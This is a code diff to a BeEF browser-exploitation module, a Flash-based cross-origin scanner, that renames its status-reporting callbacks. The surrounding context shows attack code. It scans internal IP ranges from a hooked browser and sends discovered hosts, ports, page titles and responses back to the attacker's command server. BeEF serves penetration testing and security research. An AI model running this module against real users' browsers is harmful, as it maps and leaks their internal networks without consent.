@@ -14,7 +14,7 @@ beef.execute(function() {
 
   // check if Flash is installed (not always reliable)
   if(!beef.browser.hasFlash()) {
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.status.error());
     return;
   }
 
@@ -48,7 +48,7 @@ beef.execute(function() {
     // set target IP range
     var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
     if (range == null || range[1] == null) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.status.error());
       return;
     }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
@@ -123,7 +123,7 @@ beef.execute(function() {
               'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +
 
               'if (data.match("securityErrorHandler")) {' +
-              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive", beef.are.status_success());' +
+              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive", beef.status.success());' +
               '}' +
 
               'if (!data.match("Hijacked Contents:")) return;' +
@@ -135,7 +135,7 @@ beef.execute(function() {
               '}' +
 
               'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
-              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response, beef.are.status_success());' +
+              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response, beef.status.success());' +
             ' }', url);
             } catch(e) {
               beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
